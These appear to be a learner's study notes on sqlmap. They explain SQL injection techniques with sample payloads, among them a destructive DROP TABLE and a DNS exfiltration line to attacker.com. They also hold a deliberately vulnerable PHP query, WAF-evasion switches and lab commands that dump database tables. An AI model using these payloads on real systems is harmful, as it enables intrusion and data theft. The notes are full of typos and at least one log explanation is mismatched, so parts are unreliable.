# SQLMAP Overview:
SQLMAP is the only prenetration testing tool that can properly detect and exploit all know SQLI types, we see the types of SQL injection supported by SQLMap iwth the
`sqlmap -hh` command.
The technique character BEUSTQ refers to the following:
- B: Boolean-based blind
- E: Error-based
- U: Uniopn query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

## Bolean-based blind SQL injection:
`AND 1=1`
Sqlmap exploits Boolean-based blind SQL Injection vulnerabilities through the differention of TRUE form FALSE query results. effectively retriving 1 byte of information per requests.
The differention is based on comparing server response to determine whether the SQL query returned TRUE or FALSE.
This ranges from fuzzy comparision of raw response content, HTTP codes, page titles, filtered text and other factors:
- TRUE results are generally based on response having none or marginal difference to the regular server response.
- FALSE results are based on response having substancial differences form the regular server response.
- Boolean-based blind SQL Injection is considered as the most common SQLi type in web app.

## Error-based SQL Injection:
`AND GTID_SUBSET(@@version,0)`
If the database managment system(DBMS) errors are begin returned as part of the server response for any db-related problems, then there is prabability that they can be used to carry the result
for requested queries.
Specialized  payloads for the current DBMS are used, targeting the funtion that cause know musbehaivior. Has the most comprehnsive list of such related payloas and covers Error-based SQL injection
for following DBMSes:
- Mysql --> PostgreSQL --> Oracle
- Microsoft SQL Server --> Sybase --> Vertica
- IBM DB2 --> Firebird --> MonetDB
Error-based SQLi is considered as faster than all other types, expect UNION query-based, cause it can retrieve a limited amount of data "chunjs" though each request.

## UNion query-based:
`UNION ALL SELECT 1, @@version,3`
Whit the usage of UNION, it's generally possible to extend the original vulnerable query with the injection statements resuts. This way, if the original query results ae rendered
are rendered as part of the response, the attacker can ger additional results form teh injected statements within the page response itself.
This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole db table fo interest with a single request.

## Stacked queries:
`;DROP TABLE user`
Stacking SQL queries, also kwon as the 'piggy-backing', is the from of injection additional SQL statements after the vulnerable one, in case that there is required for running non-query statements stacking
must be supported by the vulnerable plataform. SQLMAp can use such vulnerabilities to run non-query statements executed in advanced features.

## Time-based blind SQL injection:
`AND 1=IF(2>1,SLEEP(5),0)`
The principle of Time-based blind SQL Injection is similar to the Bolean-based blind SQL injection, by here the response time is used as the source for the differentiation between TRUE or FALSE.
- TRUE response is generally characterized by the noticiable difference in the reponse time compared to the regular server response.
- FALSE response should result in a response time indistinguishable from regular response times.
Is considerably slower than the boolean-based SQLi, since queries resulting in TRUE would delay the sercer response. The SQLi type is used in cases where Boolean-based blind SQL INjection is not applicable.
For example, in case the vulnerable SQL statements is non-query executed as part of the auxiliary funtionality whitout any effect to the page rendering process, Time-based is used
out of the necessity, as boolean injectiuon would not really work in this base.

## INline queries:
`SELECT(SELECT @@version) from`
This type of injection embedded as query whithin the original query, SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way.

## Out-of-band SQL INjection:
`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
This is considered on of the most adv types of SQLi, used in cases where all other types are either unsupported by the vulnerable we app or are to slow.
By running the SQLMAP on the DNS server for the domain under control, SQLMAP can preform the attack by forcing the server to request non-existent subdomains, where foo would be the SQL response we want receive.
SQLMap can then collect these erroring DNS requests and collect to foo part, to form the entire SQL response.

# Gettting Started with SQLMAP
Basic listing shows only the basic options and switches, sufficient in most cases
`sqlmap -h
 sqlmap -hh`

## Basic Scenario:
A penetration tester access the web page that accepts user input via GET parameter. They then want to test if the web page is affected by th SQL injection vulnerability, they would want to exploit it, retrieve much
information as possible from the back-end db, or even try to access the underlying file system and execute OS commands.
```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```
As errro reporting is enable for SQL query, there will be a db error returned as part of the web-server response in case of any SQL query execution problems.
Run against the example, located ate he example:

> [!NOTE]
> In this case, option '-u' is used to provide the target URL, while the switch '--branch' is used for skipping any required user-input by autho choosing.

# SQLMAP OUTPUT DESCRIPTION:
At the end of the previous section, the sqlmap output showed us a lot indo duiring its scan, this data is usually crucial to understand, as it guieds us though the automated SQL injection process. This shows us exaclty what
kind of vulnerabilities SQLMAP is exploiting, which helps us report what type of injection the web app has.
This can also become handly if we wnated to manually exploit the web app once SQLMap determine the type of injection and vulnerable parameter.

## Log Messagees Description:
The following are some of the most common messages usuallt during a scan of SQLMap, along with an example of each fomr the previus description:

- URL content is stable:
Log Message:
    -  "target URL content is stable"
This means that there are no major changes between responses in case of contious identical requests, this is important foprm the automation point of view since, in the event
of stable response, it's ez to spot differences cuased by the potential SQLi attempts. Whule stabitily is importabt, SQLMAP has advance mechanism to automatically remove the potencial "noise" that could come form
protential unstable targets.

- Parameter Appears to be dynamic:
Log message:
    - "GET parameter 'id' appears to be dynamic"
It's always desired for the tested parameter to be dynamic, as is sign that any changes made to its value would result in a  change in the response; hence the parameter may be linked to a db.
IN case the output is "static" and does not change, it could be a indicator that the value of the testes parameter is not processed by the target, at least in the current context.

- Parameter might be injectable:
Log Message: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
As discussed before, DMBS errors are a good indication of the potential SQLi, there was a MySQL error when SQLMAP sends an intentionally invalid  value was used, which indiciates that the tested parameter could be SQLi injectable
and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanims has to be prove in the subsequent run.

- Parameter might be vulnerable to XSS attack:
Log Message:
    - "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
While it's not primary purpouse, SQLMAP also runs a quick heuristic test fo teh presence of an XSS vulnerability. In large-scale test, where a lot of parameter are being testes with SQLMAp
it's nice to have  these kinds of fast heurisit check, especially if there are no SQLi vulnerabilities found.

- Back-end DBMS is '...'
Log Message:
    - "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
In normal run, SQLMap test for all supported DMBSes. In case there is clear indicate that the target is using specific DMBS, we can narrow down the payload to just that specific DMBS.

- Level/risk values:
Log message:
    - "for the remaining test. do you want to include all for 'MySQL' extending provide level(1) and risk (1) values[Y/n]"
Just a warning that parts of the used payloads are found in the response. This behavior could cuuse problems to automation tools, as it represent the junk. SQLMAP has filtering mechanims to remvove such junk before comparing
the original page content.

- Parameter appers to be injectable:
Log Message:
    - "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
This message indicates that the parameter appers to be injectable, though there is still a chance for it to be false-positive finding. In the case of boolean-based blind
and similar SQLI types where is a high chance of false-positive, at the end of the run, SQLMAP perform extensive testing consisting of simple logic checks for removal of false-positive findings.
Additionally, with --string="luther" indicates the SQLMAP regonized and used the apperance of constant string value luther in the response for distinguishing TRUE from FALSE responses.
This is a important cuase in such a casesm there is no need for the usage internal mechanism, such as dynamicity/reflection removal or fuzzy comparision of reponses, which connot be considered as false-positive.

- Time-based comparision statistical mode:
Log Message:
    - "time-based comparison requires a larger statistical model, please wait........... (done)"
SQLMAP uses sa statical model for hte recognition og regualer and delayed target responses. For this model to work, there ir a requirement to collect a suffucient number of regular response times.
SQLMAP can statistically distinguish between the deliberate delay even in the high-latency network enviroments.

- Extending UNION query injection tech test:
Log Message:
    -  "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
UNION-query SQLi checks require consederbly more requests for successful recongnition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable ,
the number of request is capped to a constanst value for this types checks.
If there is a goos chance that the target is vulnerable, especially as one other SQLi technique is found, SQLMAP extendes the def number of request for UNION query SQLi, cause of a higher expectancy of success.

- Technique appears to be usable:
Log Message:
    - "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
As heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a tech know as ORDER by is checked for usubility. In case that is usable, SQLMAP can quicky
recogize correct number of requeired UNION column by conducting the binary-search approach.
> [!NOTE]
> That this depends on the affected table in the vulnerable query.

- Parameter is vulnerable:
Log Message:
    - "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
This is one of the most impt messages of SQLMAP, as it means that the parameter was found to be vulnerable to SQL injections. The user may only want to find at least one injection point
usable against the target. If we were running and extensive test on the web app and want to report all potential vulnerabilities, we can conitinue searching for lla vulnerable parameters.

- Sqlmap identified injection points:
Log Message:
    - "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
 After is a listing of all injection points with types, title, and payloads, which represent the final proof of successful detection and explotation of found SQLi vulnerabilities. It should be noted that SQLMAP lists
 only those findings which are provably exploitable.

- Data logged to text files:
Log Message:
    - "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
This indicates local file system location for storing all logs, sessions, and output data for specific target. After such a initial run, where the injection point is successfully detected,
all details for future runs are stored inside the same directory session files.

# Running SQLMAP on the HTTP request:
- Curls commnad:
One of the best and ez ways to preperly setup an SQLMAP request against the specific target is by utilizing Copy as curl ft form within Network monitor pane inside the web.
By pastin the clipboard content into a command line and changing the original comman curl to sqlmap, we are able to use SQLMAP with the identical curl command:
`sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
WHen providing data for testing to Sqlmap, there has to be either a parameter value that could be assessed for SQLi vulnerabily or speciailized options/switches for automatic parameter finding --crawl --form or -g

- GET/POST Requests:
In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previus example. As for testing POST data the --data flag can be used as follow:
`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
In such cases, POST parametes uid and name will be tested for SQLi vulnerability. IF we have a clear indicate that the parameter uid is prone to an SLQi vulnerability, we could narrow down the test to only this parameter
usinf [-p uid]. We could mark it inside the provide data iwht the usage of special marker [*] ad follows:
`sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`

- FULL HTTP Requests:
If we need to specifiy a complex HTTP request with lots of differnt values and an eloganted POST body, we can use the -r flag. With this option. SQLMAP is provided with the request file, containing the whole HTTP request inside a single textual file. In a common scenario
such, HTTP request can be capturede form within specialized proxy app and written into the request file as follow:
We can either manually copy the HTTP request form within burp and write it to a file, or we can right-click the request within BUrp and copy to the file.
Another wat of capturing the full HTTP request would be through using the browser, as mentioned, or choosing the option Copy> Copy Request Headers.
To run SQLMAP with and HTTP request file, we use the -r flag
`slqmap -r req.txt`

- Custom SQLmap Request:
For craft complicated request manually, there are numerous switches and option for fine-tune SQLmap. For example a cookie value:
`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
Same like the opetion -H/--header:
`sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
We can apply the same option like --host, --referer, and -A/ --user-agent, which are used to specify to same HTTP headers value.
There is a switch --random-agent designed to randomly select a User-Agent header value form the included databes or regular browser values. This is a important
switch to remember, as mor and mor protection solutions automatically drop all HTTP trafic containingthe recogizable def SQL map user-agent value.
The --mobile switch can be used to imitate the smartphone by using the same header value.
`qlmap -u www.target.com --data='id=1' --method PUT`

- Custom HTTP Request:
Apart form the most common form-data POST body style [id=1], Sqlmap also supp JSON formatted [{"id":1}] and XML formatted Http request.
Support for these formats is implemented in a "relaxed" manner, there are no strict constraints on how parameter values are stored inside.
POST body is relatively simple and short the option --data will suffice.
    - cat req.txt
    - sqlmap -r req.txt

Exercise
Content tables:
- Case 2:
sqlmap -u http://94.237.61.48:51401/case2.php --dump --batch --forms --crawl=2
- Case 3:
sqlmap -r /home/../../../c.txt -p cookie --threads 10 --dump -T flag3 --batch
- Case 4:
sqlmap -r /home/../../../case4.txt --threads 10 --dump -T flag4 --batch
